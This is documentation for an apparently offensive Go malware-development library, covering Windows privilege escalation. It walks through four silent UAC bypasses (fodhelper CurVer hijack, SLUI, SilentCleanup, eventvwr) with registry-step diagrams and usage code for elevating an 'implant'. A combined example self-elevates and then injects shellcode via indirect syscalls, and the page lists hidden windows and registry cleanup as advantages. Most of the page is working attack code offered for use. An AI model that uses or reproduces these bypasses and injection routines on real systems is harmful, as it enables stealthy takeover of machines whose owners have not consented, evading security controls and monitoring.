---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# Privilege Escalation

[<- Back to Tokens Overview](README.md)

**MITRE ATT&CK:** [T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
**D3FEND:** [D3-UAP - User Account Profiling](https://d3fend.mitre.org/technique/d3f:UserAccountProfiling/)

---

## Primer

Even if you have an administrator account on Windows, your processes run with limited privileges by default. User Account Control (UAC) prevents automatic elevation -- you need to explicitly "Run as administrator" for each program.

**Convincing the system you are the boss so you can access everything.** Privilege escalation bypasses UAC by exploiting auto-elevating Windows programs (like `fodhelper.exe`) that run as high-integrity without prompting. You hijack their behavior to execute your code with elevated privileges.

---

## How It Works

### Escalation Methods

```mermaid
flowchart TD
    START["Need elevated\nprivileges"] --> Q1{"Have user\ncredentials?"}

    Q1 -->|Yes| Q2{"Need separate\nprocess?"}
    Q2 -->|"Yes (exec.Cmd)"| EXECAS["ExecAs()\nLogonUserW + SysProcAttr.Token"]
    Q2 -->|"Yes (CreateProcess)"| LOGON["CreateProcessWithLogon()\nCreateProcessWithLogonW"]
    Q2 -->|"No (same process)"| IMP["ImpersonateThread()\n(see impersonation.md)"]

    Q1 -->|No| Q3{"UAC prompt\nacceptable?"}
    Q3 -->|Yes| RUNAS["ShellExecuteRunAs()\n'runas' verb + UAC dialog"]
    Q3 -->|No| Q4{"Which UAC\nbypass?"}

    Q4 --> FOD["FODHelper()\nWin10+ CurVer hijack"]
    Q4 --> SLUI["SLUI()\nexefile handler hijack"]
    Q4 --> SILENT["SilentCleanup()\n%windir% env override"]
    Q4 --> EVT["EventVwr()\nmscfile handler hijack"]

    style EXECAS fill:#4a9,color:#fff
    style LOGON fill:#49a,color:#fff
    style RUNAS fill:#a94,color:#fff
    style FOD fill:#94a,color:#fff
    style SLUI fill:#94a,color:#fff
    style SILENT fill:#94a,color:#fff
    style EVT fill:#94a,color:#fff
```

### UAC Bypass Mechanism (FODHelper Example)

```mermaid
sequenceDiagram
    participant Implant as Implant (Medium IL)
    participant Reg as Registry (HKCU)
    participant Fod as fodhelper.exe (Auto-elevate)
    participant Payload as Payload (High IL)

    Implant->>Reg: Create key:<br/>HKCU\Software\Classes\{random}\shell\open\command
    Implant->>Reg: Set default value = "C:\payload.exe"
    Implant->>Reg: Create key:<br/>HKCU\Software\Classes\ms-settings\CurVer
    Implant->>Reg: Set default value = "{random}"

    Implant->>Fod: cmd.exe /C fodhelper.exe
    Note over Fod: fodhelper.exe auto-elevates<br/>(no UAC prompt)
    Fod->>Reg: Read ms-settings handler<br/>CurVer -> {random}
    Reg-->>Fod: shell\open\command = "C:\payload.exe"
    Fod->>Payload: Launch payload as High IL

    Implant->>Reg: Clean up registry keys
```

---

## Usage

### ExecAs: Run a Process as Another User

```go
import (
    "context"
    "github.com/oioio-space/maldev/win/privilege"
)

// Run cmd.exe as another user (returns exec.Cmd for lifetime management)
cmd, err := privilege.ExecAs(
    context.Background(),
    false,           // not domain-joined
    ".",             // local machine
    "admin",         // username
    "Password123!",  // password
    "cmd.exe",       // program
    "/C", "whoami",  // arguments
)
if err != nil {
    log.Fatal(err)
}

// IMPORTANT: Wait to avoid leaking the child process handle
cmd.Wait()
```

### CreateProcessWithLogon

```go
import "github.com/oioio-space/maldev/win/privilege"

err := privilege.CreateProcessWithLogon(
    "CORP",          // domain
    "admin",         // username
    "Password123!",  // password
    `C:\`,           // working directory
    "cmd.exe",       // program
    "/C", "whoami",  // arguments
)
```

### ShellExecuteRunAs (UAC Prompt)

```go
import "github.com/oioio-space/maldev/win/privilege"

// Prompts a UAC dialog for elevation
err := privilege.ShellExecuteRunAs(
    `C:\Windows\System32\cmd.exe`,
    `C:\`,
    "/C", "whoami /priv",
)
```

### UAC Bypass: FODHelper

```go
import "github.com/oioio-space/maldev/privesc/uac"

// Silently elevate via fodhelper.exe (Win10+, no UAC prompt)
err := uac.FODHelper(`C:\implant.exe`)
```

### UAC Bypass: SilentCleanup

```go
// Silently elevate via SilentCleanup scheduled task
err := uac.SilentCleanup(`C:\implant.exe`)
```

### UAC Bypass: EventVwr

```go
// Silently elevate via eventvwr.exe mscfile handler
err := uac.EventVwr(`C:\implant.exe`)
```

### UAC Bypass: EventVwr with Alternate Credentials

```go
// Elevate via eventvwr.exe using another user's credentials
err := uac.EventVwrLogon("CORP", "admin", "Password123!", `C:\implant.exe`)
```

### Check Current Privileges

```go
import "github.com/oioio-space/maldev/win/privilege"

admin, elevated, err := privilege.IsAdmin()
fmt.Printf("Admin group: %v, Elevated: %v\n", admin, elevated)

isMember, _ := privilege.IsAdminGroupMember()
fmt.Printf("Admin group member: %v\n", isMember)
```

---

## Combined Example: Escalate + Inject

```go
package main

import (
    "fmt"
    "log"
    "os"

    "github.com/oioio-space/maldev/inject"
    "github.com/oioio-space/maldev/privesc/uac"
    "github.com/oioio-space/maldev/win/privilege"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    // Check if already elevated
    _, elevated, _ := privilege.IsAdmin()
    if !elevated {
        // Self-elevate via FODHelper UAC bypass
        exePath, _ := os.Executable()
        if err := uac.FODHelper(exePath); err != nil {
            fmt.Println("UAC bypass failed, trying SLUI...")
            _ = uac.SLUI(exePath)
        }
        return // original process exits, elevated copy continues
    }

    // Now running elevated -- perform injection via indirect syscalls.
    inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
        Config:        inject.Config{Method: inject.MethodCreateThread},
        SyscallMethod: wsyscall.MethodIndirect,
    })
    if err != nil { log.Fatal(err) }

    shellcode := []byte{/* ... */}
    if err := inj.Inject(shellcode); err != nil { log.Fatal(err) }
}
```

---

## Advantages & Limitations

### Advantages

- **Four UAC bypass methods**: FODHelper, SLUI, SilentCleanup, EventVwr cover Win10/Win11
- **Registry cleanup**: All UAC bypass methods defer-delete their registry keys
- **Hidden windows**: All spawned processes use `SysProcAttr{HideWindow: true}`
- **ExecAs returns exec.Cmd**: Caller manages child process lifetime
- **Domain + local support**: `ExecAs` adapts logon type for domain vs. local accounts

### Limitations

- **UAC bypasses are well-known**: EDR products monitor registry keys used by these techniques
- **Admin group required**: UAC bypass only works for users already in the Administrators group
- **Credential exposure**: `ExecAs` and `CreateProcessWithLogon` require plaintext passwords
- **EventVwr timing**: 2-second sleep for eventvwr to read registry -- may fail under heavy load
- **No PPID spoofing**: Spawned processes show the real parent PID

---

## API Reference

### win/privilege

```go
func IsAdmin() (admin bool, elevated bool, err error)
func IsAdminGroupMember() (bool, error)
func ExecAs(ctx context.Context, isInDomain bool, domain, username, password, path string, args ...string) (*exec.Cmd, error)
func CreateProcessWithLogon(domain, username, password, wd, path string, args ...string) error
func ShellExecuteRunAs(path, wd string, args ...string) error
```

### privesc/uac

```go
func FODHelper(path string) error
func SLUI(path string) error
func SilentCleanup(path string) error
func EventVwr(path string) error
func EventVwrLogon(domain, user, password, path string) error
```
